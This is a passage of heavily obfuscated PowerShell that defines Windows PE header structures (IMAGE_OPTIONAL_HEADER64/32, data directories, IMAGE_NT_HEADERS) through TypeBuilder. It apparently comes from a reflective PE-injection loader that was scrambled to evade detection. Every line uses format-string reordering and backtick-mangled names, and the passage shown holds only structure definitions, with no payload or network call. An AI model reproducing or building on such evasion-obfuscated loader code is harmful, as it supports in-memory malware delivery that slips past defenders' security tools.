        (${TyPE`B`UiL`deR}.("{2}{0}{1}"-f 'neFiel','d','Defi').Invoke(("{2}{3}{0}{1}"-f 'ac','kReserve','S','izeOfSt'), [UInt64], ("{1}{0}"-f'ic','Publ'))).("{0}{2}{1}" -f'S','tOffset','e').Invoke(72) | &("{0}{1}" -f 'O','ut-Null')
        (${TY`pEBUI`L`dER}.("{1}{2}{3}{0}"-f 'ield','Defi','ne','F').Invoke(("{3}{0}{2}{4}{1}"-f'e','t','OfStackCom','Siz','mi'), [UInt64], ("{1}{0}"-f 'ic','Publ'))).("{0}{1}{2}"-f'Set','Offs','et').Invoke(80) | &("{2}{1}{0}" -f'Null','ut-','O')
        (${T`yP`EBUILDer}.("{1}{2}{0}"-f'd','DefineFi','el').Invoke(("{0}{3}{1}{2}" -f'S','OfHeapRe','serve','ize'), [UInt64], ("{1}{0}" -f 'ic','Publ'))).("{0}{2}{1}"-f 'Se','ffset','tO').Invoke(88) | &("{1}{2}{0}"-f '-Null','O','ut')
        (${Typ`EBu`ILdER}.("{1}{3}{0}{2}"-f'fin','D','eField','e').Invoke(("{0}{2}{3}{1}" -f'S','mit','i','zeOfHeapCom'), [UInt64], ("{1}{0}" -f 'ic','Publ'))).("{0}{2}{1}" -f'Set','fset','Of').Invoke(96) | &("{0}{2}{1}" -f 'Ou','-Null','t')
        (${T`YPEBU`i`LDEr}.("{1}{3}{2}{0}"-f 'ld','Defin','e','eFi').Invoke(("{2}{1}{0}{3}" -f'r','de','Loa','Flags'), [UInt32], ("{0}{1}{2}" -f 'Pub','l','ic'))).("{2}{0}{1}"-f'etOffse','t','S').Invoke(104) | &("{1}{2}{0}" -f 'l','Out-N','ul')
        (${T`yPE`BUilD`ER}.("{0}{2}{1}" -f'DefineF','eld','i').Invoke(("{3}{1}{0}{2}" -f 'dSiz','n','es','NumberOfRvaA'), [UInt32], ("{1}{0}" -f 'ic','Publ'))).("{0}{1}{2}"-f 'S','etOff','set').Invoke(108) | &("{0}{1}"-f 'O','ut-Null')
        (${t`y`peBU`ILDER}.("{0}{1}{2}" -f 'Defi','n','eField').Invoke(("{3}{0}{2}{1}" -f'po','tTable','r','Ex'), ${ima`G`E`_dA`Ta_Di`RectORy}, ("{0}{1}"-f 'Publ','ic'))).("{2}{0}{1}" -f 'tOf','fset','Se').Invoke(112) | &("{0}{2}{1}"-f 'Out-','ull','N')
        (${TYp`eBUi`lDER}.("{0}{1}{2}" -f'De','fi','neField').Invoke(("{2}{0}{1}"-f'mp','ortTable','I'), ${image`_DaT`A_dIRe`c`To`RY}, ("{1}{2}{0}"-f'c','Publ','i'))).("{1}{2}{3}{0}" -f'ffset','S','et','O').Invoke(120) | &("{1}{2}{0}" -f 'ull','O','ut-N')
        (${t`y`pebuI`LdEr}.("{3}{1}{2}{0}"-f 'Field','fin','e','De').Invoke(("{1}{2}{0}" -f 'e','Resource','Tabl'), ${Im`Ag`e_D`ATa_DireCtory}, ("{0}{1}"-f 'Pub','lic'))).("{0}{2}{1}"-f'SetOff','et','s').Invoke(128) | &("{0}{1}"-f 'O','ut-Null')
        (${T`YPebUiL`d`eR}.("{0}{2}{3}{1}" -f'Def','ield','in','eF').Invoke(("{3}{0}{2}{1}"-f'ptionTa','e','bl','Exce'), ${IMage_da`T`A_dIr`E`cT`ory}, ("{0}{1}"-f 'Pub','lic'))).("{1}{0}{2}" -f'O','Set','ffset').Invoke(136) | &("{1}{2}{0}" -f 'll','Out','-Nu')
        (${TY`pE`BU`ilder}.("{2}{1}{0}" -f 'neField','fi','De').Invoke(("{1}{3}{2}{0}"-f 'Table','Certi','cate','fi'), ${imAgE`_DATA_`d`i`REc`T`OrY}, ("{1}{0}"-f'ublic','P'))).("{0}{1}{2}" -f 'Set','Off','set').Invoke(144) | &("{0}{2}{1}"-f'Ou','l','t-Nul')
        (${Typ`EB`U`ilDeR}.("{1}{0}{2}"-f'ie','DefineF','ld').Invoke(("{4}{2}{1}{0}{3}" -f'cationTa','o','seRel','ble','Ba'), ${Imag`e_D`At`A_diRECtorY}, ("{1}{2}{0}"-f'lic','P','ub'))).("{3}{0}{1}{2}" -f 'etOf','f','set','S').Invoke(152) | &("{0}{2}{1}" -f'Out-N','l','ul')
        (${tYP`EbU`ildeR}.("{3}{1}{2}{0}"-f 'd','neF','iel','Defi').Invoke(("{0}{1}" -f'De','bug'), ${i`mA`gE_DAtA_DiReCT`oRY}, ("{1}{0}" -f'c','Publi'))).("{2}{3}{0}{1}" -f 'fse','t','Set','Of').Invoke(160) | &("{2}{0}{1}" -f'u','t-Null','O')
        (${ty`Pebuil`d`eR}.("{1}{3}{2}{0}" -f'ld','Def','eFie','in').Invoke(("{1}{2}{3}{0}" -f 'ure','Archit','ec','t'), ${ima`GE_`dATa_diR`ect`Ory}, ("{0}{1}"-f'Pu','blic'))).("{2}{1}{0}" -f'et','tOffs','Se').Invoke(168) | &("{2}{0}{1}"-f 't-Nul','l','Ou')
        (${tYpe`B`UilD`er}.("{2}{0}{1}" -f'efineFi','eld','D').Invoke(("{0}{2}{1}"-f'Glo','r','balPt'), ${I`m`A`GE_`dAT`A_Di`RecTORY}, ("{0}{1}" -f 'Pub','lic'))).("{1}{2}{0}" -f 'ffset','S','etO').Invoke(176) | &("{0}{1}" -f 'Out-Nu','ll')
        (${Ty`pEbUiLD`er}.("{2}{1}{0}"-f 'eField','fin','De').Invoke(("{0}{1}" -f'TLS','Table'), ${Image_`Da`TA_d`IrEC`TO`RY}, ("{0}{1}"-f 'Pub','lic'))).("{1}{0}{2}" -f'etOffse','S','t').Invoke(184) | &("{0}{1}{2}" -f'Ou','t-','Null')
        (${tYp`eB`UILdER}.("{0}{1}{2}{3}"-f 'D','ef','ine','Field').Invoke(("{3}{0}{1}{2}" -f'fi','gTab','le','LoadCon'), ${IM`AG`E`_DAtA_d`iReCT`ORy}, ("{0}{1}{2}"-f 'P','ub','lic'))).("{2}{1}{0}" -f'set','Off','Set').Invoke(192) | &("{0}{1}{2}" -f'Out-Nu','l','l')
        (${tYP`eBuiL`dER}.("{1}{2}{0}" -f 'ld','D','efineFie').Invoke(("{1}{2}{0}"-f 'ort','Boun','dImp'), ${IMAGE`_daTA_dir`E`ct`oRy}, ("{0}{1}" -f 'Publ','ic'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(200) | &("{1}{0}" -f 't-Null','Ou')
        (${TYP`eBuI`ldEr}.("{2}{1}{0}" -f'd','iel','DefineF').Invoke('IAT', ${I`MAg`E_da`TA`_Di`REctOrY}, ("{1}{0}"-f'ublic','P'))).("{1}{2}{0}" -f'et','SetO','ffs').Invoke(208) | &("{0}{1}{2}"-f'Ou','t-','Null')
        (${TY`pE`BuIlDEr}.("{2}{3}{1}{0}" -f'ld','ie','D','efineF').Invoke(("{0}{3}{4}{2}{1}"-f 'Delay','ptor','tDescri','Im','por'), ${I`maGE_`da`TA_D`Ir`ECto`Ry}, ("{0}{1}"-f'Publ','ic'))).("{1}{2}{0}"-f 'et','SetO','ffs').Invoke(216) | &("{1}{2}{0}" -f '-Null','Ou','t')
        (${type`B`UI`lder}.("{2}{1}{3}{0}"-f 'ld','ineFi','Def','e').Invoke(("{1}{4}{2}{0}{3}"-f'timeHe','CLR','un','ader','R'), ${IM`AGE_d`A`Ta_di`RecTory}, ("{0}{2}{1}" -f'P','c','ubli'))).("{1}{0}{2}" -f'e','S','tOffset').Invoke(224) | &("{0}{1}"-f 'Out-Nu','ll')
        (${tYPebUI`Ld`ER}.("{1}{2}{3}{0}" -f'ield','D','e','fineF').Invoke(("{0}{2}{1}" -f'Reserv','d','e'), ${imAge_`DAtA_D`I`REC`To`RY}, ("{0}{2}{1}"-f'Pub','ic','l'))).("{2}{1}{0}"-f 'fset','f','SetO').Invoke(232) | &("{2}{1}{0}"-f 'll','Nu','Out-')
        ${ImaGE_`OpTI`O`N`AL_hEAdeR`64} = ${t`YpEbU`IlDER}.("{1}{0}{2}" -f 'p','CreateTy','e').Invoke()
        ${Wi`N3`2Ty`PeS} | &("{2}{1}{0}"-f'r','Membe','Add-') -MemberType ("{1}{2}{0}"-f 'operty','Not','ePr') -Name ("{4}{1}{3}{2}{0}{5}"-f 'EADER','MAGE_OPTI','H','ONAL_','I','64') -Value ${imaGe_op`Tio`NAl`_HeaD`er`64}

        
        ${A`TTrI`Butes} = ("{7}{8}{13}{15}{14}{5}{3}{4}{9}{0}{6}{10}{21}{11}{22}{20}{12}{16}{2}{1}{18}{19}{17}"-f ' P','iel',' BeforeF','la','ss, Class','iC','ublic','A','utoLayout, ',',',',','l','yout, Seale','A','s','n','d,','it','d','In','itLa',' Exp','ic')
        ${t`YpebuI`L`dEr} = ${m`oDULe`BU`I`LdER}.("{0}{2}{1}"-f 'D','ype','efineT').Invoke(("{2}{0}{1}{4}{5}{6}{3}"-f'MAG','E_','I','2','O','PT','IONAL_HEADER3'), ${aTtRIb`UT`ES}, [System.ValueType], 224)
        (${T`YPeBU`Il`der}.("{1}{0}{2}"-f'eFie','Defin','ld').Invoke(("{0}{1}" -f 'Ma','gic'), ${m`Ag`IcT`ypE}, ("{1}{0}"-f'ublic','P'))).("{0}{2}{1}"-f'SetO','set','ff').Invoke(0) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
        (${tYpe`BUIld`eR}.("{2}{3}{1}{0}"-f'ld','e','Defin','eFi').Invoke(("{0}{2}{3}{1}"-f'Maj','ion','orLinker','Vers'), [Byte], ("{1}{0}"-f'blic','Pu'))).("{0}{2}{1}"-f 'Se','set','tOff').Invoke(2) | &("{1}{0}{2}" -f'N','Out-','ull')
        (${tY`Pe`Bui`lDER}.("{2}{0}{1}{3}"-f'efineFi','e','D','ld').Invoke(("{3}{2}{0}{1}" -f 'si','on','r','MinorLinkerVe'), [Byte], ("{0}{1}{2}"-f'Pub','li','c'))).("{1}{3}{0}{2}"-f 'se','S','t','etOff').Invoke(3) | &("{2}{0}{1}"-f't-Nu','ll','Ou')
        (${typebU`ilD`ER}.("{0}{2}{1}"-f'De','ield','fineF').Invoke(("{2}{1}{0}{3}" -f'o','eOfC','Siz','de'), [UInt32], ("{1}{0}"-f 'ic','Publ'))).("{1}{0}"-f 'etOffset','S').Invoke(4) | &("{0}{2}{1}"-f 'Out-N','l','ul')
        (${tYPEbu`IL`DeR}.("{0}{2}{1}"-f 'De','eld','fineFi').Invoke(("{5}{4}{3}{2}{0}{1}" -f 'D','ata','ialized','nit','zeOfI','Si'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{1}{2}{0}" -f'fset','S','etOf').Invoke(8) | &("{0}{1}"-f'O','ut-Null')
        (${ty`PeBui`lder}.("{0}{2}{3}{1}" -f 'Def','ield','in','eF').Invoke(("{5}{4}{6}{0}{3}{2}{1}" -f 'Uni','Data','alized','niti','z','Si','eOf'), [UInt32], ("{1}{0}" -f'blic','Pu'))).("{0}{1}" -f 'Se','tOffset').Invoke(12) | &("{2}{1}{0}" -f'l','Nul','Out-')
        (${T`y`PeB`UILdER}.("{0}{3}{2}{1}" -f'De','eld','i','fineF').Invoke(("{1}{0}{3}{2}{5}{4}"-f'dd','A','ess','r','tryPoint','OfEn'), [UInt32], ("{0}{1}{2}" -f 'Pu','bl','ic'))).("{0}{2}{1}"-f'Set','fset','Of').Invoke(16) | &("{2}{1}{0}"-f 'l','t-Nul','Ou')
        (${t`YP`EbUIlD`er}.("{1}{2}{0}" -f'neField','De','fi').Invoke(("{2}{0}{1}"-f 'eOfC','ode','Bas'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{1}{2}{0}"-f 'Offset','Se','t').Invoke(20) | &("{0}{1}" -f'Ou','t-Null')
        (${Typ`eBUil`d`Er}.("{2}{1}{3}{0}"-f'ld','fineF','De','ie').Invoke(("{2}{1}{0}" -f 'OfData','ase','B'), [UInt32], ("{0}{1}" -f 'Publi','c'))).("{1}{0}" -f 'et','SetOffs').Invoke(24) | &("{1}{0}{2}"-f 'Nul','Out-','l')
        (${Typ`eB`UIl`dEr}.("{2}{1}{0}"-f 'ield','F','Define').Invoke(("{0}{1}" -f 'ImageB','ase'), [UInt32], ("{0}{1}" -f 'Pu','blic'))).("{0}{1}{2}"-f 'SetO','ffse','t').Invoke(28) | &("{1}{0}" -f 'll','Out-Nu')
        (${tY`PebU`iLDeR}.("{0}{2}{1}" -f 'D','ield','efineF').Invoke(("{1}{2}{0}{3}{4}"-f'n','Se','ctionAlig','m','ent'), [UInt32], ("{0}{1}"-f'Pub','lic'))).("{2}{1}{0}" -f't','Offse','Set').Invoke(32) | &("{1}{2}{0}" -f'Null','O','ut-')
        (${tyPe`BuiL`d`eR}.("{2}{1}{0}{3}"-f'F','efine','D','ield').Invoke(("{1}{0}{4}{3}{2}"-f'leAl','Fi','ment','gn','i'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).("{2}{1}{0}"-f 't','etOffse','S').Invoke(36) | &("{2}{0}{1}" -f 't-','Null','Ou')
        (${TYPe`B`UI`LDER}.("{0}{2}{1}"-f'Defin','ld','eFie').Invoke(("{3}{6}{4}{0}{1}{2}{5}"-f'gSys','tem','V','MajorOp','atin','ersion','er'), [UInt16], ("{1}{0}{2}"-f 'li','Pub','c'))).("{2}{1}{0}"-f'fset','etOf','S').Invoke(40) | &("{0}{1}{2}"-f'O','u','t-Null')
        (${Typ`ebu`iL`dEr}.("{2}{1}{0}" -f'd','el','DefineFi').Invoke(("{2}{5}{0}{6}{3}{4}{1}{7}{8}"-f 'er','yste','Mino','n','gS','rOp','ati','mVersi','on'), [UInt16], ("{1}{0}" -f'lic','Pub'))).("{2}{1}{0}" -f'fset','Of','Set').Invoke(42) | &("{0}{1}{2}" -f'Ou','t-','Null')
        (${TYpE`BU`iLDer}.("{2}{0}{3}{1}"-f 'eF','ld','Defin','ie').Invoke(("{0}{1}{2}{3}"-f 'Maj','orI','mageVers','ion'), [UInt16], ("{0}{1}" -f 'Publ','ic'))).("{2}{0}{3}{1}"-f 'etO','et','S','ffs').Invoke(44) | &("{0}{1}" -f'O','ut-Null')
        (${Type`BU`ILDeR}.("{2}{0}{1}"-f 'eF','ield','Defin').Invoke(("{3}{0}{1}{2}" -f 'mageV','ersio','n','MinorI'), [UInt16], ("{2}{1}{0}" -f'c','ubli','P'))).("{1}{2}{3}{0}" -f'set','Set','O','ff').Invoke(46) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
        (${tYp`EB`UIlDer}.("{3}{2}{1}{0}" -f 'd','ineFiel','f','De').Invoke(("{1}{4}{5}{2}{0}{6}{3}"-f 'stem','M','y','ion','ajo','rSubs','Vers'), [UInt16], ("{0}{2}{1}" -f 'P','c','ubli'))).("{0}{2}{1}"-f 'Set','ffset','O').Invoke(48) | &("{0}{2}{1}" -f 'Out','ll','-Nu')
        (${tYpE`B`UiL`Der}.("{2}{0}{3}{1}"-f'fineF','d','De','iel').Invoke(("{6}{4}{0}{1}{5}{3}{2}"-f'rSubsyste','mV','n','sio','no','er','Mi'), [UInt16], ("{0}{1}" -f'Pu','blic'))).("{0}{1}{2}" -f'SetO','ffse','t').Invoke(50) | &("{1}{0}{2}"-f 'ut-N','O','ull')
        (${tYp`EB`UIL`der}.("{1}{2}{0}" -f 'neField','De','fi').Invoke(("{2}{3}{0}{1}"-f 'Valu','e','Win3','2Version'), [UInt32], ("{2}{0}{1}"-f'bli','c','Pu'))).("{0}{1}{2}"-f'Set','Offs','et').Invoke(52) | &("{0}{2}{1}"-f'Out-Nu','l','l')
        (${t`Yp`ebUi`LDEr}.("{3}{0}{1}{2}"-f 'e','Fiel','d','Defin').Invoke(("{2}{1}{0}" -f 'ge','OfIma','Size'), [UInt32], ("{0}{1}" -f 'Publi','c'))).("{0}{2}{1}" -f'SetO','et','ffs').Invoke(56) | &("{2}{0}{1}"-f '-Nul','l','Out')
        (${t`yPe`Bu`iLdER}.("{2}{1}{0}"-f'eField','n','Defi').Invoke(("{2}{0}{3}{1}"-f'izeO','aders','S','fHe'), [UInt32], ("{1}{0}" -f 'ic','Publ'))).("{0}{1}{2}{3}" -f'Se','t','Of','fset').Invoke(60) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
        (${t`Ype`Bui`LDeR}.("{1}{3}{0}{2}"-f 'ineF','D','ield','ef').Invoke(("{1}{0}"-f 'kSum','Chec'), [UInt32], ("{0}{1}"-f 'Pub','lic'))).("{2}{1}{0}" -f 'set','etOff','S').Invoke(64) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
        (${TypEb`UI`LdEr}.("{3}{1}{0}{2}"-f 'el','Fi','d','Define').Invoke(("{2}{0}{1}"-f'syst','em','Sub'), ${S`UB`SYstEMTY`PE}, ("{1}{0}{2}" -f'ubl','P','ic'))).("{2}{3}{1}{0}" -f'set','tOff','S','e').Invoke(68) | &("{2}{0}{1}"-f'Nu','ll','Out-')
        (${t`Y`pe`BuIlDeR}.("{2}{1}{0}{3}"-f'iel','ineF','Def','d').Invoke(("{4}{0}{2}{1}{3}" -f 'llCharac','eristic','t','s','D'), ${dll`cH`Ar`A`ctERIS`Ti`CsTYPe}, ("{2}{1}{0}"-f 'c','ubli','P'))).("{0}{2}{1}" -f'Se','set','tOff').Invoke(70) | &("{1}{0}"-f'ull','Out-N')
        (${T`YPEBui`l`dEr}.("{2}{1}{0}" -f'Field','fine','De').Invoke(("{2}{1}{0}{3}"-f 'tac','OfS','Size','kReserve'), [UInt32], ("{0}{2}{1}" -f 'Pub','c','li'))).("{0}{1}{2}" -f 'S','etO','ffset').Invoke(72) | &("{2}{1}{0}" -f 'l','t-Nul','Ou')
        (${T`yp`EBUiL`der}.("{0}{1}{2}"-f'Def','in','eField').Invoke(("{1}{2}{0}{3}" -f'Comm','SizeOfSt','ack','it'), [UInt32], ("{0}{1}" -f 'Publi','c'))).("{2}{1}{0}" -f 'et','fs','SetOf').Invoke(76) | &("{1}{0}{2}" -f '-Nul','Out','l')
        (${t`YpeBuil`d`er}.("{1}{0}{3}{2}" -f'eF','Defin','ld','ie').Invoke(("{4}{3}{1}{0}{2}" -f 'pRes','fHea','erve','zeO','Si'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{2}{0}{1}" -f 's','et','SetOff').Invoke(80) | &("{2}{0}{1}"-f't-','Null','Ou')
        (${T`YPe`BUilDER}.("{0}{1}{3}{2}" -f'Define','F','d','iel').Invoke(("{2}{0}{3}{1}" -f'zeOfHeap','it','Si','Comm'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{2}{1}{0}"-f'fset','f','SetO').Invoke(84) | &("{1}{0}"-f 'll','Out-Nu')
        (${T`YPEbUi`LD`Er}.("{2}{1}{0}"-f'd','l','DefineFie').Invoke(("{2}{0}{1}"-f'o','aderFlags','L'), [UInt32], ("{2}{0}{1}"-f 'ubli','c','P'))).("{1}{0}{2}" -f 'etOffse','S','t').Invoke(88) | &("{0}{1}"-f'Out-N','ull')
        (${tY`PEB`U`IlDEr}.("{3}{1}{2}{0}" -f 'ld','i','e','DefineF').Invoke(("{4}{5}{3}{1}{0}{2}" -f 'nd','fRvaA','Sizes','O','Numbe','r'), [UInt32], ("{2}{1}{0}"-f'c','i','Publ'))).("{1}{0}{2}" -f'se','SetOff','t').Invoke(92) | &("{1}{2}{0}" -f 'ull','Out-','N')
        (${typEBu`IL`der}.("{1}{2}{0}" -f 'ield','De','fineF').Invoke(("{1}{0}{2}" -f 'portTa','Ex','ble'), ${i`M`Age_d`ATa`_dIrect`ORy}, ("{2}{0}{1}"-f'ub','lic','P'))).("{1}{3}{0}{2}"-f'Off','S','set','et').Invoke(96) | &("{0}{1}"-f 'Out-N','ull')
        (${tYPe`Bu`IL`dER}.("{2}{0}{3}{1}"-f'fineFie','d','De','l').Invoke(("{2}{1}{0}{3}" -f'Ta','rt','Impo','ble'), ${i`magE_DaTA`_`dIreCT`O`Ry}, ("{0}{1}" -f'Pu','blic'))).("{0}{2}{1}"-f 'SetOf','t','fse').Invoke(104) | &("{1}{0}{2}" -f'ut-N','O','ull')
        (${Ty`peb`UILdeR}.("{1}{2}{0}"-f 'd','DefineFie','l').Invoke(("{1}{2}{0}" -f'rceTable','Res','ou'), ${i`m`AGE_DAta_`dirEc`To`Ry}, ("{1}{0}" -f 'c','Publi'))).("{0}{1}" -f 'SetO','ffset').Invoke(112) | &("{0}{2}{1}" -f'Out','ll','-Nu')
        (${t`yP`eBUIl`DeR}.("{2}{0}{1}"-f 'efin','eField','D').Invoke(("{0}{4}{1}{3}{2}" -f 'Exce','ti','nTable','o','p'), ${iM`AGe`_daTA_`di`REctorY}, ("{1}{0}" -f 'ic','Publ'))).("{1}{0}{2}" -f'tO','Se','ffset').Invoke(120) | &("{0}{1}{2}" -f 'Out','-N','ull')
        (${TY`p`ebUI`LDER}.("{2}{1}{0}"-f'eld','Fi','Define').Invoke(("{1}{3}{2}{0}"-f 'Table','C','tificate','er'), ${imagE`_d`Ata_`D`IrEc`ToRy}, ("{1}{0}"-f'c','Publi'))).("{0}{1}{2}" -f 'SetOf','fs','et').Invoke(128) | &("{1}{2}{0}"-f '-Null','O','ut')
        (${t`YpEbu`IL`der}.("{3}{0}{2}{1}" -f'fine','eld','Fi','De').Invoke(("{4}{1}{5}{2}{3}{0}"-f'le','as','tionTa','b','B','eReloca'), ${i`MagE`_`D`ATA_di`R`ectoRy}, ("{1}{0}" -f 'blic','Pu'))).("{1}{2}{0}"-f'fset','Se','tOf').Invoke(136) | &("{0}{1}" -f'Out-Nul','l')
        (${tyP`eBU`IlD`er}.("{0}{2}{1}{3}" -f 'D','fineFi','e','eld').Invoke(("{0}{1}" -f 'Debu','g'), ${IMagE`_`DATA_DI`RE`Ct`ory}, ("{1}{0}"-f 'ic','Publ'))).("{1}{0}"-f'etOffset','S').Invoke(144) | &("{0}{1}" -f 'Out','-Null')
        (${type`BuILd`Er}.("{3}{0}{2}{1}"-f 'ef','ld','ineFie','D').Invoke(("{0}{2}{1}" -f'Archit','cture','e'), ${ImAGE`_daT`A_DI`R`eC`T`oRy}, ("{0}{2}{1}" -f 'P','c','ubli'))).("{2}{0}{1}" -f 'etOff','set','S').Invoke(152) | &("{0}{1}{2}"-f 'O','u','t-Null')
        (${tYPEBUi`l`DeR}.("{3}{1}{2}{0}" -f 'Field','in','e','Def').Invoke(("{1}{2}{0}{3}" -f'Pt','Glo','bal','r'), ${IM`Ag`E`_DA`Ta_Dir`Ect`oRy}, ("{1}{0}"-f'ic','Publ'))).("{0}{2}{1}"-f'SetO','fset','f').Invoke(160) | &("{1}{2}{0}" -f 'll','Ou','t-Nu')
        (${tY`PEbu`ildER}.("{3}{2}{1}{0}" -f 'ld','ie','efineF','D').Invoke(("{0}{2}{1}" -f'T','ble','LSTa'), ${IMaGe_Dat`A`_d`IREc`TORy}, ("{2}{0}{1}" -f'ubl','ic','P'))).("{1}{2}{0}" -f'et','S','etOffs').Invoke(168) | &("{1}{0}{2}"-f 't-Nul','Ou','l')
        (${T`YpEBU`Ild`ER}.("{2}{1}{0}" -f'd','ineFiel','Def').Invoke(("{1}{0}{2}{3}" -f 'T','LoadConfig','a','ble'), ${Im`A`gE_D`A`TA_dI`Re`cTORy}, ("{0}{1}"-f 'P','ublic'))).("{0}{1}{2}"-f 'Set','O','ffset').Invoke(176) | &("{0}{1}"-f 'Out-Nul','l')
        (${typebU`i`ldeR}.("{3}{1}{0}{2}" -f 'e','efin','Field','D').Invoke(("{2}{1}{0}{3}"-f 'ndI','ou','B','mport'), ${Im`Age`_d`A`T`A_`DIREctORy}, ("{1}{0}"-f 'blic','Pu'))).("{0}{1}" -f 'Se','tOffset').Invoke(184) | &("{2}{1}{0}"-f 'l','l','Out-Nu')
        (${T`YP`EBUildEr}.("{1}{0}{2}" -f'el','DefineFi','d').Invoke('IAT', ${IM`A`G`E_Data_dIREc`TOrY}, ("{0}{1}"-f'P','ublic'))).("{1}{0}{2}" -f 'Off','Set','set').Invoke(192) | &("{2}{0}{1}" -f 't-','Null','Ou')
        (${t`Yp`E`BUIlDeR}.("{3}{0}{2}{1}"-f 'i','ld','neFie','Def').Invoke(("{3}{2}{0}{1}{4}" -f 'layImp','ort','e','D','Descriptor'), ${IMa`GE_daTa_DIr`eC`T`ory}, ("{0}{1}"-f'Pub','lic'))).("{0}{1}{2}{3}" -f'SetO','f','f','set').Invoke(200) | &("{1}{0}" -f 'Null','Out-')
        (${tYp`e`BUIL`deR}.("{2}{0}{1}"-f'ef','ineField','D').Invoke(("{2}{0}{4}{1}{3}"-f'RRunti','e','CL','r','meHead'), ${I`magE_DA`Ta_d`iRECtO`Ry}, ("{1}{0}"-f'c','Publi'))).("{0}{2}{1}"-f 'Set','fset','Of').Invoke(208) | &("{1}{0}{2}"-f 'Nul','Out-','l')
        (${tY`PEbuiL`deR}.("{1}{2}{0}" -f'd','DefineFie','l').Invoke(("{1}{0}"-f 'eserved','R'), ${im`AgE_dAt`A`_dIRe`cTo`Ry}, ("{1}{0}" -f 'ublic','P'))).("{0}{1}" -f 'SetOff','set').Invoke(216) | &("{2}{1}{0}"-f'Null','ut-','O')
        ${IM`Age`_`OpTiONal_H`EA`dE`R`32} = ${TYp`eb`UIL`DER}.("{0}{1}{2}" -f 'Crea','teTyp','e').Invoke()
        ${WI`N32T`Y`pES} | &("{2}{1}{0}" -f 'r','dd-Membe','A') -MemberType ("{1}{0}{2}" -f'ope','NotePr','rty') -Name ("{4}{3}{2}{6}{5}{1}{0}" -f 'R32','ADE','N','OPTIO','IMAGE_','HE','AL_') -Value ${IMaGE_`OpTiON`AL_h`EA`d`E`R32}

        
        ${aTtR`I`BUtES} = ("{5}{4}{9}{10}{16}{14}{1}{17}{15}{8}{11}{12}{6}{2}{7}{13}{3}{0}"-f't','i','d, Bef','eldIni',' AnsiClass, C','AutoLayout,','e','o','ayout, ','las','s, P','Sea','l','reFi','ic, Sequent','L','ubl','al')
        ${T`yPebUIL`Der} = ${modu`leB`UIlD`er}.("{0}{2}{1}"-f'De','pe','fineTy').Invoke(("{2}{0}{3}{1}" -f'NT','DERS64','IMAGE_','_HEA'), ${AT`TrIbut`es}, [System.ValueType], 264)
        ${T`yPEbUI`ld`ER}.("{1}{0}{2}"-f'Fie','Define','ld').Invoke(("{3}{1}{2}{0}"-f 'e','tu','r','Signa'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{1}{0}{2}" -f 't-Nul','Ou','l')
        ${t`Yp`EBUIlDeR}.("{1}{3}{2}{0}"-f 'eField','Def','n','i').Invoke(("{2}{1}{0}" -f 'der','a','FileHe'), ${imAG`e_f`ile_`he`A`der}, ("{2}{1}{0}" -f 'c','i','Publ')) | &("{2}{0}{1}"-f'-N','ull','Out')
        ${t`ypeBU`Ild`er}.("{0}{3}{1}{2}"-f'Def','e','Field','in').Invoke(("{0}{1}{2}{3}" -f'Op','tiona','lH','eader'), ${Ima`ge_`op`TIoNAL_HEa`d`eR64}, ("{0}{1}" -f 'P','ublic')) | &("{1}{0}" -f 'ull','Out-N')
        ${i`ma`gE_nT_hEA`D`Ers64} = ${T`ypeBu`i`lDER}.("{1}{0}{2}" -f'eT','Creat','ype').Invoke()
        ${W`iN`32`TypeS} | &("{1}{0}{2}" -f'd-M','Ad','ember') -MemberType ("{2}{1}{0}"-f'y','t','NoteProper') -Name ("{1}{3}{2}{5}{0}{4}"-f 'DERS','I','T_','MAGE_N','64','HEA') -Value ${IMA`Ge_N`T_`H`EADers64}
        
        
        ${aTT`RIB`UteS} = ("{14}{13}{21}{8}{2}{6}{19}{18}{7}{0}{3}{16}{1}{4}{10}{12}{20}{5}{17}{11}{15}{9}" -f'u','ue','s','b','nti','led, Bef',',','P','las','it','alL','eF','a','utoLayo','A','ieldIn','lic, Seq','or','lass, ',' C','yout, Sea','ut, AnsiC')
        ${tYP`EBuIl`dER} = ${M`odU`lE`Bu`Ilder}.("{2}{1}{3}{0}" -f 'ype','in','Def','eT').Invoke(("{1}{5}{2}{0}{3}{4}" -f 'NT','I','GE_','_HEADER','S32','MA'), ${a`TtR`iB`UTeS}, [System.ValueType], 248)
        ${Ty`peBUi`Ld`er}.("{2}{1}{3}{0}" -f 'ield','e','D','fineF').Invoke(("{2}{1}{0}"-f'gnature','i','S'), [UInt32], ("{0}{2}{1}"-f'Pub','ic','l')) | &("{0}{1}"-f'O','ut-Null')
        ${T`yPEB`U`iLdEr}.("{0}{1}{2}"-f'DefineFie','l','d').Invoke(("{3}{0}{1}{2}"-f 'l','e','Header','Fi'), ${i`Ma`gE_f`iLe_HEAder}, ("{0}{1}" -f 'Pub','lic')) | &("{0}{2}{1}"-f 'O','t-Null','u')
        ${typE`Bu`Ilder}.("{3}{1}{2}{0}"-f 'ld','efine','Fie','D').Invoke(("{3}{1}{2}{0}{4}" -f 'lHead','io','na','Opt','er'), ${IMAG`E_Opti`O`NAl`_HEadEr32}, ("{1}{0}"-f'blic','Pu')) | &("{1}{2}{0}"-f 'Null','O','ut-')
        ${IMA`ge_nT_He`AdeR`S`32} = ${TY`pE`BuILder}.("{1}{0}{2}" -f'teT','Crea','ype').Invoke()
        ${WIn32`T`Y`Pes} | &("{1}{2}{0}"-f'ber','Add','-Mem') -MemberType ("{2}{0}{1}{3}" -f 'o','tePrope','N','rty') -Name ("{3}{2}{0}{1}{4}{5}"-f '_H','E','AGE_NT','IM','ADE','RS32') -Value ${iMaG`e_`Nt_HE`Ade`RS32}

        
        ${aTTri`B`UTES} = ("{1}{0}{20}{17}{15}{11}{7}{9}{14}{2}{8}{6}{19}{10}{16}{13}{12}{3}{18}{5}{4}"-f 'utoLayout, A','A','Public,',', B','t','i','uen','ss, C',' Seq','las','ialL','la',', Sealed','out','s, ','C','ay','i','eforeFieldIn','t','ns')
